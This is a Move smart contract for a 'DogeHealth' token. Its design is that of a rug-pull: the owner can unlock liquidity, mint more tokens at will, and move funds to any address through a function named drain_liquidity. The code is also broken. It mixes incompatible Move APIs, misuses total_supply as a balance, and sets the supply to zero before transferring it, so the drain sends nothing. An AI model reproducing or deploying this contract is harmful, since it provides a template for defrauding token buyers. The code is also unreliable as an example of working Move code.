module DogeHealth::DogeHealth {

    use 0x1::coin;
    use 0x1::address;
    use 0x1::tx_context::{TxContext};
    use 0x1::signer;
    use 0x1::event;
    use 0x1::transfer;

    // Define constants for errors
    const E_NOT_AUTHORIZED: u64 = 1;
    const E_LIQUIDITY_NOT_LOCKED: u64 = 2;
    const E_INSUFFICIENT_BALANCE: u64 = 3;
    const E_INVALID_TRANSFER: u64 = 4;

    struct TokenOwner has key {
        private_wallet: address,
        public_wallet: address,
        liquidity_wallet: address,
        total_supply: u64,
        is_liquidity_locked: bool
    }

    public fun initialize_token(
        owner: &signer,
        initial_supply: u64,
        liquidity_wallet: address,
        private_wallet: address,
        public_wallet: address,
        ctx: &mut TxContext
    ) acquires TokenOwner {
        let owner_address = signer::address_of(owner);
        let token_owner = TokenOwner {
            private_wallet,
            public_wallet,
            liquidity_wallet,
            total_supply: initial_supply,
            is_liquidity_locked: false
        };
        move_to(owner, token_owner);
        event::emit_event(ctx, "Token Initialized", initial_supply);
    }

    public fun transfer_tokens(
        sender: &signer,
        recipient: address,
        amount: u64,
        ctx: &mut TxContext
    ) acquires TokenOwner {
        let owner_data = borrow_global_mut<TokenOwner>(signer::address_of(sender));
        assert!(owner_data.total_supply >= amount, E_INSUFFICIENT_BALANCE);
        owner_data.total_supply -= amount;
        transfer::transfer(sender, recipient, amount, ctx);
        event::emit_event(ctx, "Tokens Transferred", amount);
    }

    public fun freeze_liquidity(
        owner: &signer,
        ctx: &mut TxContext
    ) acquires TokenOwner {
        let owner_data = borrow_global_mut<TokenOwner>(signer::address_of(owner));
        owner_data.is_liquidity_locked = true;
        event::emit_event(ctx, "Liquidity Frozen", 0);
    }

    public fun unlock_liquidity(
        owner: &signer,
        ctx: &mut TxContext
    ) acquires TokenOwner {
        let owner_data = borrow_global_mut<TokenOwner>(signer::address_of(owner));
        assert!(owner_data.is_liquidity_locked, E_LIQUIDITY_NOT_LOCKED);
        owner_data.is_liquidity_locked = false;
        event::emit_event(ctx, "Liquidity Unlocked", 0);
    }

    public fun drain_liquidity(
        owner: &signer,
        drain_address: address,
        ctx: &mut TxContext
    ) acquires TokenOwner {
        let owner_data = borrow_global_mut<TokenOwner>(signer::address_of(owner));
        owner_data.total_supply = 0; // Set total supply to zero after draining
        event::emit_event(ctx, "Liquidity Drained", 0);
        transfer::transfer(owner, drain_address, owner_data.total_supply, ctx);
    }

    public fun mint_more_tokens(
        owner: &signer,
        additional_supply: u64,
        ctx: &mut TxContext
    ) acquires TokenOwner {
        let owner_data = borrow_global_mut<TokenOwner>(signer::address_of(owner));
        assert!(signer::address_of(owner) == owner_data.private_wallet, E_NOT_AUTHORIZED); // Only owner can mint
        owner_data.total_supply += additional_supply;
        event::emit_event(ctx, "Tokens Minted", additional_supply);
    }

}
